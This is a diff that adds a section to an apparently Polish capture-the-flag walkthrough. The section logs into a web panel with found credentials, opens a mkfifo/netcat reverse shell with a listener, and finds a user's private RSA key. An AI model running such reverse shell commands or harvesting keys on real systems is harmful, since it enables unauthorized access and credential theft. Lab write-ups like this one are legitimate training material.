@@ -157,4 +157,34 @@ cn7824
 
 Na porcie 80 znajduje się strona internetowa z panelem logowania:
 
-![login_page](img/login_page.jpg)
+![login_page](img/login_page.JPG)
+
+Spróbujmy się zalogować przy użyciu znalezionych danych:
+
+```
+charlie:cn7823
+```
+
+Po zalogowaniu uzyskujemy dostęp do panelu, dzięki któremu możemy wykonywać dowolne polecenia na serwerze:
+
+![Panel](img/Panel.JPG)
+
+## Eksploitacja
+
+Możemy spróbować reverse shell'a, aby uzyskać połączenie z maszyną, za pomocą komendy:
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [IP] [Port] >/tmp/f
+```
+oraz
+```
+nc -lvnp 4444
+```
+
+![RevShell](img/RevShell.JPG)
+
+Po stabilizacji shella możemy przejść do eksploitacji maszyny. W katalogu domowym użytkownika charlie można znaleźć jego prywatny klucz RSA:
+
+![RSA_KEY](img/RSA_KEY.JPG)
+
+
+
